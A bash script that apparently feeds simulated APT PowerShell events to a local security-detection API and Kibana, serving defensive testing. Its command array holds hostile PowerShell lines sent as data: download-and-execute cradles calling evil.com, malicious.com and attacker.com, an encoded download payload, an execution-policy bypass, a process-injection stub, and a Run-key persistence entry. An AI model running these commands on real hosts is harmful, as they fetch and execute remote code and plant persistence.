#!/bin/bash

# APT Simulation: Malicious PowerShell Execution
# MITRE ATT&CK: T1059.001 - PowerShell

API_BASE="${API_BASE:-http://localhost:8000}"

echo "💻 APT Simulation: PowerShell Execution"
echo "======================================="
echo "Simulating various PowerShell attack techniques"
echo ""

# Array of malicious PowerShell commands commonly used by APTs
declare -a powershell_attacks=(
    # Encoded command execution
    "powershell.exe -enc SQB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgA="

    # Execution policy bypass
    "powershell.exe -ExecutionPolicy bypass -WindowStyle hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""

    # Download and execute
    "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/shell.ps1')"

    # Hidden execution with bypass
    "PowerShell.exe -noprofile -windowstyle hidden -executionpolicy bypass -Command \"& {[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iex(iwr('http://attacker.com/payload') -UseBasicParsing).Content}\""

    # Base64 encoded reverse shell
    "powershell.exe -nop -w hidden -c \"[System.Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA')\""

    # Process injection technique
    "powershell.exe -Command \"Add-Type -TypeDefinition 'using System; using System.Diagnostics; using System.Runtime.InteropServices; public class Inj{ [DllImport(\\\"kernel32.dll\\\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);'\""

    # WMI execution
    "powershell.exe -Command \"Get-WmiObject -Class Win32_Process -ComputerName localhost | Where-Object {$_.Name -eq 'notepad.exe'} | ForEach-Object {$_.Terminate()}\""

    # Registry manipulation
    "powershell.exe -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SecurityUpdate' -Value 'C:\\Windows\\Temp\\update.exe' -PropertyType String\""
)

# Array of attacker personas
declare -a attackers=(
    "apt29_lazarus"
    "apt28_fancy_bear"
    "apt1_comment_crew"
    "carbanak_group"
    "lazarus_group"
    "cozy_bear"
    "equation_group"
    "shadow_brokers"
)

# Array of target hosts
declare -a hosts=(
    "DC01.corp.local"
    "WS001.corp.local"
    "WS002.corp.local"
    "SQL01.corp.local"
    "WEB01.corp.local"
    "FILE01.corp.local"
    "EXCH01.corp.local"
)

echo "🚀 Starting PowerShell attack simulation..."
start_time=$(date)

for i in "${!powershell_attacks[@]}"; do
    command="${powershell_attacks[$i]}"
    attacker="${attackers[$((RANDOM % ${#attackers[@]}))]}"
    host="${hosts[$((RANDOM % ${#hosts[@]}))]}"
    process_id=$((1000 + RANDOM % 9000))

    # Generate realistic external IP addresses
    source_ips=("203.0.113.45" "198.51.100.88" "192.0.2.15" "185.199.108.154" "151.101.193.140")
    source_ip="${source_ips[$((RANDOM % ${#source_ips[@]}))]}"

    echo "  [$(($i + 1))/${#powershell_attacks[@]}] Simulating PowerShell execution on $host"
    echo "    User: $attacker"
    echo "    Command: ${command:0:50}..."

    # Send to simulation API - use python to create proper JSON with raw string
    response=$(python3 <<EOF | curl -s -X POST "$API_BASE/api/v1/security/simulate/powershell" -H "Content-Type: application/json" -d @-
import json
data = {
    'command': r'''$command''',
    'user': '$attacker',
    'host': '$host',
    'process_id': $process_id,
    'source_ip': '$source_ip'
}
print(json.dumps(data))
EOF
)

    if echo "$response" | grep -q "success"; then
        echo "    ✅ Event logged successfully"
    else
        echo "    ❌ Failed to log event"
    fi

    # Small delay between attacks
    sleep 1
done

end_time=$(date)

echo ""
echo "✅ PowerShell simulation completed!"
echo "📊 Attack Summary:"
echo "   PowerShell Techniques: ${#powershell_attacks[@]}"
echo "   Unique Attackers: ${#attackers[@]}"
echo "   Affected Hosts: ${#hosts[@]}"
echo "   Start Time: $start_time"
echo "   End Time: $end_time"
echo ""
echo "🔍 Check detection results:"
echo "   curl '$API_BASE/api/v1/security/threats/powershell'"
echo "   curl '$API_BASE/api/v1/security/hunt/powershell-external'"
echo ""
echo "📊 View in Kibana:"
echo "   http://localhost:5601/app/discover#/?_g=(filters:!(),query:(language:kuery,query:'log_category:powershell_execution'))"